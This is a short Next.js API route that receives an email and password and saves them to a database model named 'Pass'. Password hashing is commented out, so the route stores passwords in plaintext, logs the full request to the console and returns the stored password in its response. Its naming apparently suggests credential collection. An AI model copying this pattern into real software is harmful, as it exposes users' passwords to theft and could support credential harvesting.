import { connect } from "@/dbConfig/dbConfig";
import Pass from "@/models/passModel";
import { NextResponse } from "next/server";
// import bcryptjs from "bcryptjs";

connect();

export async function POST(request) {
  try {
    const reqBody = await request.json();
    const { email, password } = reqBody;

    console.log(reqBody);

    // Generate salt and hash the password
    // const salt = await bcryptjs.genSalt(10);
    // const hashedPassword = await bcryptjs.hash(password, salt);

    // Create a new pass entry
    const newPass = new Pass({
      email,
      password,
    });

    // Save the new pass entry to the database
    const savedPass = await newPass.save();
    console.log(savedPass);

    // Return a success response
    return NextResponse.json({
      message: "Pass sent successfully",
      success: true,
      savedPass,  // Correct the variable name here
    });

  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
